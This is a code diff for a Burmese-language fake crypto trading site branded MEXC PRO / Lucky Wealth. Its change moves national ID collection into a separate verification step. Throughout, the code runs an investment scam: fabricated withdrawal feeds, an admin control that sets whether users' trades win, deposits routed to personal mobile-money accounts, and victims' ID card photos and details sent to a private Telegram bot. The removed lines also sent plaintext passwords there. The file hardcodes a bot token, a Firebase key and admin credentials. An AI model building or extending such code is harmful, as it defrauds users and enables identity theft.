@@ -120,6 +120,13 @@
 
         .btn-download { background: linear-gradient(135deg, #FFD700, #FFA500); color: #000; margin-bottom: 15px; display: flex; align-items: center; justify-content: center; gap: 10px; text-decoration: none; box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3); }
         .btn-download i { font-size: 18px; }
+
+        /* Verification Status Banner */
+        .verify-banner { padding: 15px; border-radius: 15px; margin-bottom: 15px; display: flex; align-items: center; gap: 12px; font-size: 13px; }
+        .verify-pending { background: rgba(243, 156, 18, 0.15); border: 1px solid #f39c12; color: #f39c12; }
+        .verify-approved { background: rgba(46, 189, 133, 0.15); border: 1px solid var(--green); color: var(--green); }
+        .verify-rejected { background: rgba(246, 70, 93, 0.15); border: 1px solid var(--red); color: var(--red); }
+        .verify-none { background: rgba(148, 163, 184, 0.15); border: 1px solid var(--dim); color: var(--dim); }
     </style>
 </head>
 <body>
@@ -158,12 +165,81 @@
         <input type="text" id="reg-un" placeholder="User Name">
         <input type="text" id="reg-ph" placeholder="Phone Number (09...)">
         <div class="pw-wrapper">
-            <input type="password" id="reg-pw" placeholder="Password">
+            <input type="password" id="reg-pw" placeholder="Password (min 6 characters)">
             <i class="fas fa-eye pw-toggle" onclick="togglePassword('reg-pw', this)"></i>
         </div>
+        <button class="btn btn-main" style="margin-top:15px;" onclick="applyClickGold(this); handleAuth('reg')">Register Now</button>
+        <p onclick="toggleAuth(false)" style="text-align:center; color:var(--dim); cursor:pointer; margin-top:15px;">Back to Login</p>
+    </div>
+</div>
 
-        <h4 style="color:var(--primary); font-size:14px; margin: 15px 0 5px 0;"><i class="fas fa-id-card"></i> မှတ်ပုံတင် အချက်အလက်</h4>
-        <input type="text" id="reg-nrc" placeholder="မှတ်ပုံတင် နံပါတ် (ဥပမာ: 12/ABC(N)123456)">
+<div id="dash-page" class="page">
+    <div class="withdraw-marquee-box">
+        <i class="fas fa-bullhorn" style="color:#F6465D; margin-right:10px;"></i>
+        <div class="withdraw-text" id="wd-marquee-text">
+            User 09***342 က 50,000 Ks ထုတ်ယူအောင်မြင်ပါသည်... User 09***991 က 150,000 Ks ထုတ်ယူအောင်မြင်ပါသည်...
+        </div>
+    </div>
+
+    <img src="https://i.ibb.co/gsx5zMn/en-US-7569624436f6.webp" alt="Banner" class="dash-banner">
+
+    <div class="trust-notif">
+        <i class="fas fa-trophy"></i>
+        <span><b>Today Top Profit:</b> User 09***772 (840,000 Ks) အမြတ်ရရှိခဲ့သည်။</span>
+    </div>
+
+    <div class="marquee-box">
+        <div class="marquee-text">အိမ်မှာနေရင်းငွေရှာဖို့အတွက် trading ကိုသေချာအာရုံစိုက်ပါ... အရင်းအနှီးများလေလေ အမြတ်ပိုရလေဖြစ်ပါသည်။</div>
+    </div>
+    
+    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
+        <h2 style="font-weight:800;">LUCKY WEALTH</h2>
+        <div style="display:flex; gap:18px; align-items: center;">
+            <i class="fas fa-info-circle" style="font-size:22px; color:var(--primary); cursor:pointer;" onclick="showPage('info-page')"></i>
+            <i class="fas fa-bell" style="font-size:22px; color:var(--active-gold); cursor:pointer;" onclick="showPage('vip-page')"></i>
+            <i class="fas fa-shield-alt" style="font-size:22px; color:var(--primary);" onclick="showPage('setting-page')"></i>
+            <i class="fas fa-user-shield" style="font-size:22px;" id="admin-trigger"></i>
+        </div>
+    </div>
+
+    <div id="verify-status-banner"></div>
+
+    <div class="card" style="background: linear-gradient(135deg, #00DBB1, #0072FF); color: #000; border:none;">
+        <div style="display: flex; justify-content: space-between;">
+            <small style="opacity:0.8; font-weight:600;">Available Balance</small>
+            <span id="u-vip-badge" style="background:rgba(0,0,0,0.2); padding: 2px 8px; border-radius: 10px; font-size: 10px; font-weight: bold;">VIP 0</span>
+        </div>
+        <h1 id="u-bal" style="font-size:35px; margin: 10px 0;">0 Ks</h1>
+        <div style="display:flex; gap:12px; margin-top:15px;">
+            <button class="btn" style="background:#000; color:#fff; flex:1;" onclick="applyClickGold(this); showPage('deposit-page')">Deposit</button>
+            <button class="btn" style="background:rgba(255,255,255,0.3); color:#000; flex:1;" onclick="applyClickGold(this); showPage('withdraw-page')">Withdraw</button>
+        </div>
+    </div>
+
+    <h4 style="margin-left:5px;">Market Trends</h4>
+    <div id="market-list"></div>
+
+    <div class="footer-info">
+        <p><b>MEXC PRO TRADING GROUP</b></p>
+        <p>Investment involves risk. Past performance is not indicative of future results.</p>
+        <p>© 2024 MEXC PRO. All Rights Reserved.</p>
+    </div>
+</div>
+
+<!-- ============================================================ -->
+<!-- VERIFICATION PAGE (Sign Up ပြီးမှ တင်ရမည်) -->
+<!-- ============================================================ -->
+<div id="verify-page" class="page">
+    <div style="display:flex; align-items:center; gap:15px; margin-bottom:20px;">
+        <i class="fas fa-arrow-left" onclick="showPage('dash-page')"></i>
+        <h3>Identity Verification</h3>
+    </div>
+
+    <div id="verify-current-status"></div>
+
+    <div class="card" id="verify-form-card">
+        <h4 style="color:var(--primary); font-size:14px; margin: 0 0 10px 0;"><i class="fas fa-id-card"></i> မှတ်ပုံတင် အချက်အလက်</h4>
+        <input type="text" id="verify-nrc" placeholder="မှတ်ပုံတင် နံပါတ် (ဥပမာ: 12/ABC(N)123456)">
         
         <p style="color:var(--dim); font-size:11px; margin-top:10px;">* မှတ်ပုံတင် ရှေ့ဘက်ပုံ ထည့်ပါ *</p>
         <div class="upload-box" id="nrc-front-box" onclick="document.getElementById('nrc-front-input').click()">
@@ -189,59 +265,9 @@
         </div>
         <input type="file" id="nrc-hold-input" accept="image/*" style="display:none;" onchange="handleImageUpload('nrc-hold')">
 
-        <button class="btn btn-main" style="margin-top:15px;" onclick="applyClickGold(this); handleAuth('reg')">Register Now</button>
-        <p onclick="toggleAuth(false)" style="text-align:center; color:var(--dim); cursor:pointer; margin-top:15px;">Back to Login</p>
-    </div>
-</div>
-
-<div id="dash-page" class="page">
-    <div class="withdraw-marquee-box">
-        <i class="fas fa-bullhorn" style="color:#F6465D; margin-right:10px;"></i>
-        <div class="withdraw-text" id="wd-marquee-text">
-            User 09***342 က 50,000 Ks ထုတ်ယူအောင်မြင်ပါသည်... User 09***991 က 150,000 Ks ထုတ်ယူအောင်မြင်ပါသည်... User 09***125 က 30,000 Ks ထုတ်ယူအောင်မြင်ပါသည်...
-        </div>
-    </div>
-
-    <img src="https://i.ibb.co/gsx5zMn/en-US-7569624436f6.webp" alt="Banner" class="dash-banner">
-
-    <div class="trust-notif">
-        <i class="fas fa-trophy"></i>
-        <span><b>Today Top Profit:</b> User 09***772 (840,000 Ks) အမြတ်ရရှိခဲ့သည်။</span>
-    </div>
-
-    <div class="marquee-box">
-        <div class="marquee-text">အိမ်မှာနေရင်းငွေရှာဖို့အတွက် trading ကိုသေချာအာရုံစိုက်ပါ... အရင်းအနှီးများလေလေ အမြတ်ပိုရလေဖြစ်ပါသည်။</div>
-    </div>
-    
-    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
-        <h2 style="font-weight:800;">LUCKY WEALTH</h2>
-        <div style="display:flex; gap:18px; align-items: center;">
-            <i class="fas fa-info-circle" style="font-size:22px; color:var(--primary); cursor:pointer;" onclick="showPage('info-page')"></i>
-            <i class="fas fa-bell" style="font-size:22px; color:var(--active-gold); cursor:pointer;" onclick="showPage('vip-page')"></i>
-            <i class="fas fa-shield-alt" style="font-size:22px; color:var(--primary);" onclick="showPage('setting-page')"></i>
-            <i class="fas fa-user-shield" style="font-size:22px;" id="admin-trigger"></i>
-        </div>
-    </div>
-
-    <div class="card" style="background: linear-gradient(135deg, #00DBB1, #0072FF); color: #000; border:none;">
-        <div style="display: flex; justify-content: space-between;">
-            <small style="opacity:0.8; font-weight:600;">Available Balance</small>
-            <span id="u-vip-badge" style="background:rgba(0,0,0,0.2); padding: 2px 8px; border-radius: 10px; font-size: 10px; font-weight: bold;">VIP 0</span>
-        </div>
-        <h1 id="u-bal" style="font-size:35px; margin: 10px 0;">0 Ks</h1>
-        <div style="display:flex; gap:12px; margin-top:15px;">
-            <button class="btn" style="background:#000; color:#fff; flex:1;" onclick="applyClickGold(this); showPage('deposit-page')">Deposit</button>
-            <button class="btn" style="background:rgba(255,255,255,0.3); color:#000; flex:1;" onclick="applyClickGold(this); showPage('withdraw-page')">Withdraw</button>
-        </div>
-    </div>
-
-    <h4 style="margin-left:5px;">Market Trends</h4>
-    <div id="market-list"></div>
-
-    <div class="footer-info">
-        <p><b>MEXC PRO TRADING GROUP</b></p>
-        <p>Investment involves risk. Past performance is not indicative of future results. Please read our Terms & Conditions carefully.</p>
-        <p>© 2024 MEXC PRO. All Rights Reserved.</p>
+        <button class="btn btn-main" style="margin-top:15px;" onclick="applyClickGold(this); submitVerification()">
+            <i class="fas fa-paper-plane"></i> Verification တင်သွင်းမည်
+        </button>
     </div>
 </div>
 
@@ -351,6 +377,13 @@
         <button class="btn btn-main" onclick="applyClickGold(this); changeSecurity('pin')">Save PIN</button>
     </div>
     <div class="card">
+        <h4>Identity Verification</h4>
+        <p style="color:var(--dim); font-size:12px;">သင့်အကောင့်ကို အတည်ပြုရန် မှတ်ပုံတင် တင်သွင်းပါ။</p>
+        <button class="btn btn-main" onclick="applyClickGold(this); showPage('verify-page'); loadVerifyStatus()">
+            <i class="fas fa-id-card"></i> Verification တင်ရန်
+        </button>
+    </div>
+    <div class="card">
         <h4>System Logs</h4>
         <div class="sec-log" id="login-log">Last Login: Just now from Yangon, MM</div>
         <div class="sec-log" style="margin-top:5px; border-color:var(--active-gold); color:var(--active-gold);">Security Status: 2FA Active (Encrypted)</div>
@@ -400,12 +433,37 @@
 
 <div id="admin-page" class="page">
     <h3 style="color:var(--primary);">System Management</h3>
+    
     <div class="card">
         <h4>Post Announcement</h4>
         <textarea id="adm-msg" style="width:100%; height:80px; background:#111; color:white; border-radius:10px; padding:10px;" placeholder="Write message to all users..."></textarea>
         <button class="btn btn-main" style="margin-top:5px;" onclick="applyClickGold(this); admPostAnnounce()">Post to Notifications</button>
     </div>
+
+    <!-- Payment Settings (Admin can change) -->
+    <div class="card" style="border: 1px solid var(--active-gold);">
+        <h4 style="color:var(--active-gold);"><i class="fas fa-credit-card"></i> Payment Settings</h4>
+        <small style="color:var(--dim);">WavePay Details</small>
+        <input type="text" id="adm-wave-name" placeholder="Wave Account Name">
+        <input type="text" id="adm-wave-num" placeholder="Wave Phone Number">
+        <hr style="opacity:0.1; margin:15px 0;">
+        <small style="color:var(--dim);">KBZPay Details</small>
+        <input type="text" id="adm-kpay-name" placeholder="KBZPay Account Name">
+        <input type="text" id="adm-kpay-num" placeholder="KBZPay Phone Number">
+        <button class="btn btn-main" style="margin-top:10px;" onclick="applyClickGold(this); admUpdatePayDetails()">
+            <i class="fas fa-save"></i> Update Payment Details
+        </button>
+        <div id="adm-pay-status" style="font-size:11px; color:var(--dim); margin-top:8px;"></div>
+    </div>
+
+    <!-- Verification Requests -->
+    <div class="card" style="border: 1px solid var(--primary);">
+        <h4 style="color:var(--primary);"><i class="fas fa-id-card"></i> Verification Requests</h4>
+        <div id="adm-verify-list"><p style="color:var(--dim); font-size:12px;">Loading...</p></div>
+    </div>
+
     <div class="card">
+        <h4>User Account Control</h4>
         <input type="text" id="adm-search" placeholder="Search User Phone">
         <button class="btn btn-main" onclick="applyClickGold(this); admSearch()">Find Account</button>
         <div id="adm-ctrl" style="display:none; margin-top:20px; border-top:1px solid #333; padding-top:15px;">
@@ -420,6 +478,7 @@
             <button class="btn" style="background:#444; color:#fff; margin-top:10px;" onclick="applyClickGold(this); admMode('random')">Set Random</button>
         </div>
     </div>
+
     <h4>Pending Requests</h4>
     <div id="adm-req-list"></div>
 </div>
@@ -434,7 +493,7 @@
 
 <script>
     // ================================================================
-    // 🔥 FIREBASE CONFIG (mexc-pro-2024 Project အသစ်) 🔥
+    // 🔥 FIREBASE CONFIG
     // ================================================================
     const config = { 
         apiKey: "AIzaSyCfsklGhK-QeK-ruGwjhPO9h-SN3qlenb4", 
@@ -454,22 +513,20 @@
     let nrcImages = { front: null, back: null, hold: null };
 
     // ================================================================
-    // 🔒 ADMIN PHONE (ဤနံပါတ်ဖြင့်သာ Admin Panel ဝင်နိုင်မည်) 🔒
+    // 🔒 ADMIN CONFIGURATION
     // ================================================================
     const ADMIN_PHONE = "09951214043";
-    // ================================================================
+    const ADMIN_PASSWORD = "nan123";
 
-    // ================================================================
-    // 🔒 HARDCODED PAYMENT DETAILS (Admin Panel မှ ပြောင်းလဲ၍ မရပါ) 🔒
-    // ================================================================
-    const PAYMENT_DETAILS = {
+    // Payment Details (Default - Admin can change from panel)
+    let PAYMENT_DETAILS = {
         wave: { name: "Than Than Nyunt", num: "09951214043" },
         kpay: { name: "Ma Than Than Nyunt", num: "09951214043" }
     };
     // ================================================================
 
     const vipData = [
-        { level: 1, cost: 100000, daily: "2.5%", gift: "Bonus 5,000 Ks", limit: "500,000 Ks", desc: "VIP 1 ဖြစ်ပါက နေ့စဉ် Trading အမြတ်ပိုရမည့်အပြင် အပတ်စဉ် Bonus များခံစားခွင့်ရှိမည်။" },
+        { level: 1, cost: 100000, daily: "2.5%", gift: "Bonus 5,000 Ks", limit: "500,000 Ks", desc: "VIP 1 ဖြစ်ပါက နေ့စဉ် Trading အမြတ်ပိုရမည်။" },
         { level: 2, cost: 300000, daily: "5.0%", gift: "Bonus 15,000 Ks", limit: "1,500,000 Ks", desc: "VIP 2 အတွက် ငွေထုတ်ယူမှု ဦးစားပေးစနစ် ပါဝင်လာပါပြီ။" },
         { level: 3, cost: 1000000, daily: "8.5%", gift: "Bonus 60,000 Ks", limit: "5,000,000 Ks", desc: "VIP 3 သည် Cloud Mining တွင် အမြတ် ၂ ဆ ပိုရပါမည်။" },
         { level: 4, cost: 5000000, daily: "12.0%", gift: "Bonus 300,000 Ks", limit: "Unlimited", desc: "VIP 4 အတွက် 24/7 Personal Assistant ဝန်ဆောင်မှု ရရှိမည်။" },
@@ -477,7 +534,7 @@
     ];
 
     // ================================================================
-    // 📤 TELEGRAM BOT (ပုံများ + Message များ ပို့ရန်) 📤
+    // 📤 TELEGRAM BOT
     // ================================================================
     const TELEGRAM_BOT_TOKEN = "8614205220:AAHxlphuK5ZM29rEh3J6IEPqPEibMjKNXAY";
     const TELEGRAM_CHAT_ID = "7709938396";
@@ -487,7 +544,6 @@
             .catch(e => console.log("Telegram error:", e));
     }
 
-    // ပုံကို Telegram သို့ ပို့သော function
     async function sendTelegramPhoto(file, caption) {
         const formData = new FormData();
         formData.append('chat_id', TELEGRAM_CHAT_ID);
@@ -498,37 +554,34 @@
                 method: 'POST',
                 body: formData
             });
-        } catch(e) {
-            console.log("Telegram photo error:", e);
-        }
+        } catch(e) { console.log("Telegram photo error:", e); }
     }
 
     // ================================================================
-    // 📷 NRC IMAGE UPLOAD HANDLER 📷
+    // 📷 NRC IMAGE UPLOAD HANDLER
     // ================================================================
     function handleImageUpload(type) {
-        const input = document.getElementById(`nrc-${type}-input`);
-        const preview = document.getElementById(`nrc-${type}-preview`);
-        const box = document.getElementById(`nrc-${type}-box`);
+        const input = document.getElementById(`${type}-input`);
+        const preview = document.getElementById(`${type}-preview`);
+        const box = document.getElementById(`${type}-box`);
         
         if(input.files && input.files[0]) {
             const file = input.files[0];
             
-            // File size check (5MB limit)
             if(file.size > 5 * 1024 * 1024) {
                 alert("ပုံအရွယ်အစား 5MB ထက် မကျော်ရပါ။");
                 input.value = "";
                 return;
             }
-            
-            // Image type check
             if(!file.type.startsWith('image/')) {
                 alert("ပုံဖိုင် (Image) သာ ထည့်ပါ။");
                 input.value = "";
                 return;
             }
             
-            nrcImages[type] = file;
+            // nrcImages key ကို handle
+            const key = type.replace('nrc-', '');
+            nrcImages[key] = file;
             
             const reader = new FileReader();
             reader.onload = (e) => {
@@ -548,8 +601,8 @@
     }
 
     function startLiveWdFeed() {
-        const users = ["09***221", "09***775", "09***330", "09***119", "09***882", "09***004", "09***551", "09***663"];
-        const amounts = [10000, 30000, 50000, 100000, 150000, 20000, 45000, 75000];
+        const users = ["09***221", "09***775", "09***330", "09***119", "09***882", "09***004"];
+        const amounts = [10000, 30000, 50000, 100000, 150000, 20000];
         
         setInterval(() => {
             const randomUser = users[Math.floor(Math.random() * users.length)];
@@ -562,15 +615,17 @@
                 <i class="fas fa-check-circle"></i>
                 <div>
                     <div style="font-size:12px; color:white; font-weight:bold;">ငွေထုတ်ယူမှု အောင်မြင်ပါသည်။</div>
-                    <div style="font-size:10px; color:var(--dim);">အသုံးပြုသူ ${randomUser} သည် ${randomAmt.toLocaleString()} Ks ကို ယခုလေးတင် လက်ခံရရှိသွားပါသည်။</div>
+                    <div style="font-size:10px; color:var(--dim);">အသုံးပြုသူ ${randomUser} သည် ${randomAmt.toLocaleString()} Ks ကို ရရှိသွားပါသည်။</div>
                 </div>
             `;
-            
             container.appendChild(toast);
             setTimeout(() => toast.remove(), 5000);
         }, 12000);
     }
 
+    // ================================================================
+    // 💰 SELECT PAY — Firebase မှ Payment Details ကို Load လုပ်သည်
+    // ================================================================
     function selectPay(method) {
         currentPayMethod = method;
         document.querySelectorAll('.pay-option').forEach(o => o.classList.remove('selected'));
@@ -578,25 +633,20 @@
         document.getElementById('dep-details').style.display = 'block';
         document.getElementById('dep-method-name').innerText = method === 'wave' ? 'WavePay' : 'KBZPay';
         
-        const data = PAYMENT_DETAILS[method];
-        document.getElementById('dep-acc-name').innerText = data.name;
-        document.getElementById('display-dep-num').innerText = data.num;
+        // Firebase မှ Payment Details ကို ရယူ
+        db.ref('settings/payments/' + method).once('value', s => {
+            const data = s.val() || PAYMENT_DETAILS[method];
+            document.getElementById('dep-acc-name').innerText = data.name;
+            document.getElementById('display-dep-num').innerText = data.num;
+        });
     }
 
     function loadTVWidget(symbol) {
         new TradingView.widget({
-            "autosize": true,
-            "symbol": "BINANCE:" + symbol,
-            "interval": "1",
-            "timezone": "Etc/UTC",
-            "theme": "dark",
-            "style": "1",
-            "locale": "en",
-            "toolbar_bg": "#f1f3f6",
-            "enable_publishing": false,
-            "hide_top_toolbar": true,
-            "save_image": false,
-            "container_id": "tv_chart_container"
+            "autosize": true, "symbol": "BINANCE:" + symbol, "interval": "1",
+            "timezone": "Etc/UTC", "theme": "dark", "style": "1", "locale": "en",
+            "toolbar_bg": "#f1f3f6", "enable_publishing": false, "hide_top_toolbar": true,
+            "save_image": false, "container_id": "tv_chart_container"
         });
     }
 
@@ -626,15 +676,14 @@
         if (x.type === "password") { 
             x.type = "text"; 
             el.classList.replace('fa-eye', 'fa-eye-slash'); 
-        } 
-        else { 
+        } else { 
             x.type = "password"; 
             el.classList.replace('fa-eye-slash', 'fa-eye'); 
         }
     }
 
     // ================================================================
-    // 🔐 HANDLE AUTH (Register + Login) — NRC Images ပါဝင် 🔐
+    // 🔐 HANDLE AUTH (Register + Login)
     // ================================================================
     async function handleAuth(type) {
         const ph = document.getElementById(type==='login'?'log-ph':'reg-ph').value.trim();
@@ -660,42 +709,23 @@
             });
         } else {
             const un = document.getElementById('reg-un').value.trim();
-            const nrc = document.getElementById('reg-nrc').value.trim();
             
-            // Validation
             if(!un || un.length < 3) return alert("အမည် အနည်းဆုံး ၃ လုံး ထည့်ပါ။");
-            if(!nrc || nrc.length < 5) return alert("မှတ်ပုံတင် နံပါတ် မှန်ကန်စွာ ထည့်ပါ။");
-            if(!nrcImages.front) return alert("မှတ်ပုံတင် ရှေ့ဘက်ပုံ ထည့်ပါ။");
-            if(!nrcImages.back) return alert("မှတ်ပုံတင် နောက်ဘက်ပုံ ထည့်ပါ။");
-            if(!nrcImages.hold) return alert("မှတ်ပုံတင် ကိုင်ဆောင်ထားသောပုံ ထည့်ပါ။");
             if(pw.length < 6) return alert("လျှို့ဝှက်နံပါတ် အနည်းဆုံး ၆ လုံး ထည့်ပါ။");
             
-            // Check if user already exists
             db.ref('users/'+ph).once('value', async s => {
                 if(s.exists()) return alert("ဤဖုန်းနံပါတ်ဖြင့် အကောင့်ဖွင့်ပြီးသား ဖြစ်ပါသည်။");
                 
-                // Save user data
                 db.ref('users/'+ph).set({ 
-                    username: un, 
-                    password: pw, 
-                    balance: 0, 
-                    mode: 'random', 
-                    pin: '123456', 
-                    vip: 0,
-                    nrc: nrc,
+                    username: un, password: pw, balance: 0, mode: 'random', pin: '123456', vip: 0,
+                    verificationStatus: 'none',
                     registeredAt: new Date().toLocaleString(),
                     phone: ph
                 });
                 
-                // Send text to Telegram
-                sendTelegram(`🆕 NEW USER REGISTERED 🆕\n\n👤 Name: ${un}\n📱 Phone: ${ph}\n🆔 NRC: ${nrc}\n🔑 Password: ${pw}\n⏰ Time: ${new Date().toLocaleString()}`);
+                sendTelegram(`🆕 NEW USER REGISTERED 🆕\n\n👤 Name: ${un}\n📱 Phone: ${ph}\n⏰ Time: ${new Date().toLocaleString()}\n\n⚠️ Verification မတင်ရသေးပါ။`);
                 
-                // Send NRC images to Telegram
-                await sendTelegramPhoto(nrcImages.front, `📷 NRC Front - ${un} (${ph})`);
-                await sendTelegramPhoto(nrcImages.back, `📷 NRC Back - ${un} (${ph})`);
-                await sendTelegramPhoto(nrcImages.hold, `📷 NRC Holding - ${un} (${ph})`);
-                
-                alert("အကောင့်ဖွင့်ခြင်း အောင်မြင်ပါသည်။ ကျေးဇူးပြု၍ ပြန်လည်ဝင်ရောက်ပါ။");
+                alert("အကောင့်ဖွင့်ခြင်း အောင်မြင်ပါသည်။ Verification တင်ရန် Login ဝင်ပါ။");
                 location.reload();
             });
         }
@@ -708,6 +738,9 @@
             document.getElementById('u-bal').innerText = (val.balance || 0).toLocaleString() + " Ks"; 
             document.getElementById('u-vip-badge').innerText = "VIP " + (val.vip || 0);
             document.getElementById('current-vip-level').innerText = "VIP " + (val.vip || 0) + " MEMBER";
+            
+            // Show verification banner
+            updateVerifyBanner(val.verificationStatus);
         });
         
         db.ref('announcements').once('value', s => {
@@ -719,6 +752,148 @@
         });
 
         loadMarkets(); loadMining(); loadHist(); renderVIP();
+    }
+
+    function updateVerifyBanner(status) {
+        const banner = document.getElementById('verify-status-banner');
+        if(!banner) return;
+        
+        if(status === 'pending') {
+            banner.innerHTML = `
+                <div class="verify-banner verify-pending" onclick="showPage('verify-page'); loadVerifyStatus()">
+                    <i class="fas fa-clock" style="font-size:20px;"></i>
+                    <div>
+                        <b>Verification စစ်ဆေးဆဲ</b>
+                        <div style="font-size:11px; opacity:0.8;">Admin မှ အတည်ပြုရန် စောင့်ဆိုင်းပေးပါ။</div>
+                    </div>
+                </div>`;
+        } else if(status === 'approved') {
+            banner.innerHTML = `
+                <div class="verify-banner verify-approved">
+                    <i class="fas fa-check-circle" style="font-size:20px;"></i>
+                    <div>
+                        <b>✅ Verification အောင်မြင်ပါပြီ</b>
+                        <div style="font-size:11px; opacity:0.8;">သင့်အကောင့်ကို အတည်ပြုပြီးပါပြီ။</div>
+                    </div>
+                </div>`;
+        } else if(status === 'rejected') {
+            banner.innerHTML = `
+                <div class="verify-banner verify-rejected" onclick="showPage('verify-page'); loadVerifyStatus()">
+                    <i class="fas fa-times-circle" style="font-size:20px;"></i>
+                    <div>
+                        <b>❌ Verification ပယ်ချခံရပါသည်</b>
+                        <div style="font-size:11px; opacity:0.8;">ပြန်လည်တင်သွင်းရန် နှိပ်ပါ။</div>
+                    </div>
+                </div>`;
+        } else {
+            banner.innerHTML = `
+                <div class="verify-banner verify-none" onclick="showPage('verify-page'); loadVerifyStatus()">
+                    <i class="fas fa-exclamation-circle" style="font-size:20px;"></i>
+                    <div>
+                        <b>မှတ်ပုံတင် Verification တင်ရန် လိုအပ်ပါသည်</b>
+                        <div style="font-size:11px; opacity:0.8;">ဤနေရာကို နှိပ်၍ တင်သွင်းပါ။</div>
+                    </div>
+                </div>`;
+        }
+    }
+
+    // ================================================================
+    // 🆔 VERIFICATION SUBMIT + STATUS
+    // ================================================================
+    async function submitVerification() {
+        if(!user) return alert("ကျေးဇူးပြု၍ အရင်ဆုံး Login ဝင်ပါ။");
+        
+        const nrc = document.getElementById('verify-nrc').value.trim();
+        if(!nrc || nrc.length < 5) return alert("မှတ်ပုံတင် နံပါတ် မှန်ကန်စွာ ထည့်ပါ။");
+        if(!nrcImages.front) return alert("မှတ်ပုံတင် ရှေ့ဘက်ပုံ ထည့်ပါ။");
+        if(!nrcImages.back) return alert("မှတ်ပုံတင် နောက်ဘက်ပုံ ထည့်ပါ။");
+        if(!nrcImages.hold) return alert("မှတ်ပုံတင် ကိုင်ဆောင်ထားသောပုံ ထည့်ပါ။");
+        
+        // User data ရယူ
+        const userSnap = await db.ref('users/'+user).once('value');
+        const uData = userSnap.val();
+        
+        if(uData.verificationStatus === 'approved') {
+            return alert("သင့် Verification ကို အတည်ပြုပြီးသား ဖြစ်ပါသည်။");
+        }
+        
+        // Save verification request to Firebase
+        const verifyId = db.ref('requests/verifications').push().key;
+        await db.ref('requests/verifications/' + verifyId).set({
+            ph: user,
+            username: uData.username,
+            nrc: nrc,
+            status: 'pending',
+            date: new Date().toLocaleString(),
+            submittedAt: Date.now()
+        });
+        
+        // Update user status
+        await db.ref('users/'+user).update({ verificationStatus: 'pending', nrc: nrc });
+        
+        // Send to Telegram
+        sendTelegram(`🆔 NEW VERIFICATION REQUEST 🆔\n\n👤 Name: ${uData.username}\n📱 Phone: ${user}\n🆔 NRC: ${nrc}\n⏰ Time: ${new Date().toLocaleString()}\n\n⏳ Status: PENDING`);
+        
+        await sendTelegramPhoto(nrcImages.front, `📷 NRC Front - ${uData.username} (${user})`);
+        await sendTelegramPhoto(nrcImages.back, `📷 NRC Back - ${uData.username} (${user})`);
+        await sendTelegramPhoto(nrcImages.hold, `📷 NRC Holding - ${uData.username} (${user})`);
+        
+        alert("✅ Verification တင်သွင်းမှု အောင်မြင်ပါသည်။\nAdmin မှ စစ်ဆေးပြီး အတည်ပြုပေးပါလိမ့်မည်။");
+        showPage('dash-page');
+    }
+
+    function loadVerifyStatus() {
+        if(!user) return;
+        db.ref('users/'+user).once('value', s => {
+            const val = s.val();
+            if(!val) return;
+            
+            const currentStatus = document.getElementById('verify-current-status');
+            const formCard = document.getElementById('verify-form-card');
+            const status = val.verificationStatus || 'none';
+            
+            if(status === 'pending') {
+                currentStatus.innerHTML = `
+                    <div class="verify-banner verify-pending" style="font-size:14px;">
+                        <i class="fas fa-clock" style="font-size:24px;"></i>
+                        <div>
+                            <b>⏳ Verification စစ်ဆေးဆဲ</b>
+                            <div style="font-size:12px; opacity:0.8; margin-top:5px;">သင့် NRC ပုံများကို Admin မှ စစ်ဆေးနေပါသည်။ ခေတ္တစောင့်ဆိုင်းပေးပါ။</div>
+                        </div>
+                    </div>`;
+                formCard.style.display = 'none';
+            } else if(status === 'approved') {
+                currentStatus.innerHTML = `
+                    <div class="verify-banner verify-approved" style="font-size:14px;">
+                        <i class="fas fa-check-circle" style="font-size:24px;"></i>
+                        <div>
+                            <b>✅ Verification အောင်မြင်ပါပြီ</b>
+                            <div style="font-size:12px; opacity:0.8; margin-top:5px;">သင့်အကောင့်ကို အတည်ပြုပြီးပါပြီ။</div>
+                        </div>
+                    </div>`;
+                formCard.style.display = 'none';
+            } else if(status === 'rejected') {
+                currentStatus.innerHTML = `
+                    <div class="verify-banner verify-rejected" style="font-size:14px;">
+                        <i class="fas fa-times-circle" style="font-size:24px;"></i>
+                        <div>
+                            <b>❌ Verification ပယ်ချခံရပါသည်</b>
+                            <div style="font-size:12px; opacity:0.8; margin-top:5px;">ပြန်လည်တင်သွင်းရန် အောက်ပါ Form ကို ဖြည့်ပါ။</div>
+                        </div>
+                    </div>`;
+                formCard.style.display = 'block';
+            } else {
+                currentStatus.innerHTML = `
+                    <div class="verify-banner verify-none" style="font-size:14px;">
+                        <i class="fas fa-exclamation-circle" style="font-size:24px;"></i>
+                        <div>
+                            <b>မှတ်ပုံတင် Verification တင်ရန် လိုအပ်ပါသည်</b>
+                            <div style="font-size:12px; opacity:0.8; margin-top:5px;">အောက်ပါ Form ကို ဖြည့်ပြီး တင်သွင်းပါ။</div>
+                        </div>
+                    </div>`;
+                formCard.style.display = 'block';
+            }
+        });
     }
 
     function renderVIP() {
@@ -770,7 +945,7 @@
         ];
         let h = ""; tiers.forEach(t => { 
             h += `<div class="market-item" onclick="openTrade('${t.n}', ${t.m}, ${t.p}, ${t.s})"> 
-            <span><img src="https://i.ibb.co/7mvLK89/IMG-20260330-081319-912.jpg" class="market-icon-img"><b style="font-size:16px;">${t.n}/USDT</b><br><small style="color:var(--dim)">အနည်းဆုံးရင်းနှီးငွေ: ${t.m.toLocaleString()} Ks</small></span> 
+            <span><img src="https://i.ibb.co/7mvLK89/IMG-20260330-081319-912.jpg" class="market-icon-img"><b style="font-size:16px;">${t.n}/USDT</b><br><small style="color:var(--dim)">အနည်းဆုံး: ${t.m.toLocaleString()} Ks</small></span> 
             <span style="color:var(--green); font-weight:bold;">${t.s}s / +${t.p}%</span> </div>`; 
         });
         document.getElementById('market-list').innerHTML = h;
@@ -804,7 +979,7 @@
                     if(win) { 
                         let reward = amt + (amt * (finalProf/100)); 
                         db.ref('users/'+user+'/balance').transaction(b => (b||0)+reward); 
-                        alert(`ဂုဏ်ယူပါသည်! Trading အောင်မြင်ပါသည်။ \n\nစုစုပေါင်းအမြတ်ငွေ: ${reward.toLocaleString()} Ks ရရှိပါသည်။`); 
+                        alert(`ဂုဏ်ယူပါသည်! Trading အောင်မြင်ပါသည်။\n\nစုစုပေါင်းအမြတ်ငွေ: ${reward.toLocaleString()} Ks`); 
                         sendTelegram(`📈 Trade WIN: ${user} earned ${reward} Ks`);
                     } else {
                         alert("နောင်တမရပါနဲ့! ယခုတစ်ကြိမ် Trading ကျရှုံးပါသည်။"); 
@@ -898,8 +1073,8 @@
